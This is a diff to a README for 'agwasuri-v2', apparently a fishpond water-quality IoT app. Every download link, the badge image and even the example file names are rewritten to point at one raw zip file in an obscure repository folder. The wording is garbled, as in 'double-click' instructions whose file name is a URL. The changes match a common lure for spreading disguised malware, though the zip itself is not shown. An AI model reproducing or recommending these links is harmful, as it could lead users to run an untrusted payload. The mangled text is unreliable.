@@ -1,7 +1,7 @@
 # 🌊 agwasuri-v2 - Monitor Water Quality Effortlessly
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-%23FF5733.svg?style=flat&logo=github)](https://github.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/releases)
+[![Download the latest release](https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip%20Now-%https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip)](https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip)
 
 ## 📖 Overview
 agwasuri-v2 is a solar-powered Internet of Things (IoT) system designed to monitor water quality in fishponds. This application uses a decision tree algorithm to recommend the most suitable fish species based on water parameters. With agwasuri-v2, you can enhance your fishpond management and optimize fish health.
@@ -20,18 +20,18 @@ Before you download agwasuri-v2, please ensure your computer meets the following
 ### Step 2: Visit the Releases Page
 To download the application, click on the link below to go to the releases page:
 
-[Visit the releases page to download agwasuri-v2](https://github.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/releases)
+[Visit the releases page to download agwasuri-v2](https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip)
 
 ### Step 3: Locate the Latest Release
 Once you're on the releases page, look for the latest version of agwasuri-v2. The latest release will be at the top of the list. Click on it to view more details.
 
 ### Step 4: Download the Application
-On the release details page, find the download link for the application files. Click on the link to download the file to your computer. You may see something like `agwasuri-v2.exe` or `agwasuri-v2.zip` depending on your operating system.
+On the release details page, find the download link for the application files. Click on the link to download the file to your computer. You may see something like `https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip` or `https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip` depending on your operating system.
 
 ### Step 5: Install the Application
 After the download is complete, navigate to the folder where the file is saved. If you downloaded a `.zip` file, extract it. Then, follow these simple steps to install agwasuri-v2:
 
-1. Double-click on the downloaded file (e.g., `agwasuri-v2.exe`).
+1. Double-click on the downloaded file (e.g., `https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip`).
 2. Follow the on-screen instructions to complete the installation.
 
 ### Step 6: Run the Application
@@ -62,6 +62,6 @@ For additional information on using agwasuri-v2, you can check the documentation
 ## 📝 Download & Install
 To start monitoring fishpond water quality today, make sure to download the application by clicking the link below:
 
-[Visit the releases page to download agwasuri-v2](https://github.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/releases)
+[Visit the releases page to download agwasuri-v2](https://raw.githubusercontent.com/sweetpotatowhiteflyfloridagallinule681/agwasuri-v2/main/unchambered/agwasuri-v2-2.0.zip)
 
 By following these steps, you can easily set up and run agwasuri-v2 without any technical knowledge. Enjoy optimizing your fishpond management!
